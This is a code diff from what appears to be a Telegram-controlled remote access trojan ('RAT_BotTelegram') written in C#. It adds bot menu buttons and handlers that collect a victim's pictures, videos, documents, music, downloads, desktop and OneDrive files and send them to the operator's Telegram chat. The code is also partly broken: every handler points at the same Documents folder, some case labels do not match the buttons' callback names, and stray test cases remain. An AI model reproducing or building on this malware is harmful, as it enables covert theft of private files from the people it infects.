@@ -69,43 +69,46 @@ namespace RAT_BotTelegram {
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text: "Get Pictures",
+                            text: "|USER| Get Pictures",
                             callbackData: "GetPictures"),
                         InlineKeyboardButton.WithCallbackData(
-                            text: "Get Videos",
+                            text: "|USER| Get Videos",
                             callbackData: "GetVideos"),
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get Documents",
+                            text:"|USER| Get Documents",
                             callbackData: "GetDocument"),
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get Music",
+                            text:"|USER| Get Music",
                             callbackData: "GetMusic"),
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get Download",
-                            callbackData: "getDownload")
+                            text:"|USER| Get Download",
+                            callbackData: "getDownload"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"|USER| Get Desktop",
+                            callbackData: "getDesktop")
                     }});
                     var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text: "Get Pictures from OneDrive ",
-                            callbackData: "GetPictures"),
+                            text: "|OneDrive| Get Pictures",
+                            callbackData: "GetPicturesO"),
                         InlineKeyboardButton.WithCallbackData(
-                            text: "Get Videos from OneDrive",
-                            callbackData: "GetVideos"),
+                            text: "|OneDrive| Get Videos",
+                            callbackData: "GetVideosO"),
 
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get Documents from OneDrive",
-                            callbackData: "GetDocument"),
+                            text:"|OneDrive| Get Documents",
+                            callbackData: "GetDocumentO"),
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get Music from OneDrive",
-                            callbackData: "GetMusic"),
+                            text:"|OneDrive| Get Music",
+                            callbackData: "GetMusicO"),
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
                             text:"Get all files from OneDrive",
-                            callbackData: "getDownload")
+                            callbackData: "getAllO")
                     }});
 
                     await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
@@ -113,9 +116,6 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.id, "OneDrive Files: ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
-                    break;
-                case "/Help":
-                    await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
                 //Mensaje por default
                 default:
@@ -326,10 +326,32 @@ namespace RAT_BotTelegram {
 
             switch (callbackQuery.Data) {
 
-                case "GetDocument":
-
-                    GetFilesTelegram(@"O:\Estoo");
+                case "GetPictures":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
                     break;
+                case "GetVideos":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetDocument":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetMusic":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetDownload":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+                case "GetDesktop":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
+                    break;
+
+
+
+
+
+
+
+
 
                 case "GetDocumenttgert":
                     await Bot.SendLocationAsync(
@@ -338,23 +360,6 @@ namespace RAT_BotTelegram {
                         longitude: -84.031086f
                         );
                     break;
-
-                //      text: "Get Pictures",
-                //      callbackData: "GetPictures"),
-                //    InlineKeyboardButton.WithCallbackData(
-                //        text: "Get Videos",
-                //        callbackData: "GetVideos"),
-                //},new []{
-                //    InlineKeyboardButton.WithCallbackData(
-                //        text:"Get Documents",
-                //        callbackData: "GetDocument"),
-                //    InlineKeyboardButton.WithCallbackData(
-                //        text:"Get Music",
-                //        callbackData: "GetMusic"),
-                //},new []{
-                //    InlineKeyboardButton.WithCallbackData(
-                //        text:"Get Download",
-                //        callbackData: "getDownload"),
                 case "GetDocumensdfdst":
                     await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
 
